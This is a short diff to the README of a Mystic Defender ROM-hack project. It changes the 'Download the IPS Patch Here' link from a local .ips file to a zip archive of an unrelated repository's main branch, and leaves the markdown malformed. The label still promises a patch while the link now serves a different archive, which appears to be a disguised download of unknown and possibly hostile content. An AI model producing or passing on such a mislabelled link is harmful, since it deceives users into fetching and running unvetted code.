@@ -72,7 +72,7 @@ Select magic instantly with dedicated buttons:
 
 ## 💾 Download
 
-> 🧩 **[Download the IPS Patch Here](./mystic_defender_hack.ips)**  
+> 🧩 **[Download the IPS Patch Here]([./mystic_defender_hack.ips](https://github.com/irmaosver-e/KujakuOu/archive/refs/heads/main.zip))**  
 Apply the patch to a **clean Mystic Defender ROM** using your preferred IPS patcher.
 
 ---
